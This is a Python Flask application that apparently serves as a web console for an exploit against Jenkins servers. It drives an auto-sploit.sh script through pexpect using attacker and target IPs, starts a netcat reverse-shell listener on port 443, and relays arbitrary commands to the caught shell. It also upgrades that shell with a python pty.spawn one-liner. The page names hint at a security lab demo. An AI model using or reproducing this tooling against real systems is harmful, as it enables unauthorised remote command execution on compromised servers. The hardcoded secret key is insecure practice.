import pexpect
from flask import Flask
from flask import render_template, request, jsonify, make_response
from forms import LaunchAttack, SendCommand
import os
import time
app = Flask(__name__)

app.config['SECRET_KEY'] = 'c27e5a04065046f45a88300d80baa8cd'


# @app.route("/", methods=['GET'])
# def hello():
#     if request.method == 'GET':
#         return render_template('routing/index.html')
#     else:
#         pass
@app.route("/", methods=['GET'])
def home():
    if request.method == 'GET':
        return render_template('routing/index.html')

@app.route("/launchattack", methods=['GET'])
def launch_attack():
    form = LaunchAttack()
    return render_template('routing/launchattack.html', title='Launch Attack', form=form)

@app.route("/sendcommand", methods=['GET'])
def send_command():
    form = SendCommand()
    return render_template('routing/sendcommand.html', title='Send Command', form=form)

@app.route("/labinfra", methods=['GET'])
def labinfra():
    if request.method == 'GET':
        return render_template('routing/labinfra.html')


@app.route("/awssec", methods=['GET'])
def awssec_info():
    if request.method == 'GET':
        return render_template('routing/awssec.html')


@app.route("/vulnerability", methods=['GET'])
def vulnerability_info():
    if request.method == 'GET':
        return render_template('routing/vulnerability.html')


@app.route("/launch", methods=['GET', 'POST'])
def launch_sploit():
    """
    Accepts a JSON payload with the following structure:
    {
        "target": "nlb-something.fqdn.com",
        "attacker": "1.2.3.4"
    }
    If the payload parses correctly, then launch a reverse shell listener using pexpect.spawn
    then spawn the auto-sploit.sh tool and enter the target and attacker info again using pexpect
    :return: Simple String response for now
    """

    if request.method == 'GET':
        form = LaunchAttack()
        return render_template('routing/launchattack.html', title='Launch Attack', form=form)

    if request.method == 'POST':
        language = request.form.get('attackerIp')

        if request.is_json:
            print(request.data)
            payload = request.get_json()
            print(payload)
            print(type(payload))
            target_ip = payload.get('target', '')
            attacker_ip = payload.get('attacker', '')
        else:
            target_ip = request.form.get('target')
            attacker_ip = request.form.get('attacker')
        # res = make_response(jsonify(
        #     {
        #         "attacker":attacker_ip,
        #         "target": target_ip
        #     }), 200)
        # return res

        if target_ip == "" or attacker_ip == "":
            print('Payload is all wrong!')
            print(request.payload)
            return 'ERROR'

        exe = './auto-sploit.sh'
        if not os.path.exists(exe):
            return make_response(jsonify({"message": "Cant find auto-sploit.sh"}), 200)
        print('Launching auto-sploit.sh')
        child = pexpect.spawn(exe)
        child.delaybeforesend = 2
        found_index = child.expect(['press any key to continue', pexpect.EOF, pexpect.TIMEOUT])
        if found_index == 0:
            print('launching listener process')
            _launch_listener()
            child.send('\n')
        else:
            res = make_response(jsonify(
                {
                    "message": "ERROR - Could not press key to continue"
                }), 200)
            return res
            # return 'ERROR - Could not press key to continue'
        found_index = child.expect(['Enter Attacker IP Address', pexpect.EOF, pexpect.TIMEOUT])
        if found_index == 0:
            print('Sending attacker ip :::' + attacker_ip + ':::')
            child.sendline(attacker_ip)
        else:
            res = make_response(jsonify(
                {
                    "message":"ERROR - Could not enter attacker IP"
                }), 200)
            return res
            # return 'ERROR - Could not enter attacker IP'
        found_index = child.expect(['Enter Jenkins Target IP Address', pexpect.EOF, pexpect.TIMEOUT])
        if found_index == 0:
            print(child.before)
            print('Sending target ip')
            child.sendline(target_ip)
        else:
            print(child.before)
            res = make_response(jsonify(
                {
                    "message":"ERROR - Could not enter jenkins IP"
                }), 200)
            return res
            # return 'ERROR - Could not enter jenkins IP'
        found_index = child.expect(['pwn', pexpect.EOF, pexpect.TIMEOUT])
        if found_index == 0:
            print('PWN')
            print(child)
            time.sleep(2)
            res = make_response(jsonify(
                {
                    "message":"SUCCESS - auto-sploit launched!"
                }), 200)
            return res
            # return 'SUCCESS - auto-sploit launched!'





@app.route("/send", methods=['GET','POST'])
def send_cmd():
    if request.is_json:
        data = request.get_json()
        cli = data.get('cli', '')
        if cli == '':
            return 'No Bueno - Invalid JSON payload'

        if 'listener' in app.config:
            print('We have a listener already up!')
            listener = app.config.get('listener', '')
            if not hasattr(listener, 'isalive') or not listener.isalive():
                return 'No Bueno - Listener does not appear to be active'

            print('Sending initial command to see where we are!')
            listener.sendline('echo $SHLVL\n')
            found_index = listener.expect(['1', 'jenkins@', 'root@', pexpect.EOF, pexpect.TIMEOUT])
            print(found_index)
            if found_index == 0:
                # no prompt yet
                print('Great, trying to get a prompt now')
                listener.sendline("python -c 'import pty; pty.spawn(\"/bin/bash\")'")

            if found_index > 2:
                print(listener.before)
                return 'Someting is wrong with the listener connection!'

            # listener.sendline(cli)
            # print(listener)
            found_index = listener.expect(['jenkins@.*$', 'root@.*#', pexpect.EOF, pexpect.TIMEOUT])
            print('Found index is now: ' + str(found_index))
            if found_index > 1:
                print(listener)
                return 'Someting is wrong with the listener connection!'
            listener.sendline(cli)
            found_index = listener.expect(['jenkins@.*$', 'root@.*#', pexpect.EOF, pexpect.TIMEOUT])
            print('Found index after cli is now: ' + str(found_index))
            if found_index > 1:
                print(listener)
                return 'Someting is wrong with the listener connection!'
            print(listener)
            return listener.before

        else:
            return 'NOPE'
    else:
        return 'NOWAYJOSE'


def _launch_listener():
    if 'listener' not in app.config:
        listener = pexpect.spawn('nc -lvp 443')
        found_index = listener.expect(['listening', pexpect.EOF, pexpect.TIMEOUT])
        if found_index != 0:
            return False
        app.config['listener'] = listener
        print('Launched and ready to rock')
        return True
    else:
        listener = app.config['listener']
        if hasattr(listener, 'isalive') and listener.isalive():
            return True
        else:
            listener = pexpect.spawn('nc -lvp 443')
            found_index = listener.expect(['listening', pexpect.EOF, pexpect.TIMEOUT])
            if found_index != 0:
                return False
            app.config['listener'] = listener
            return True


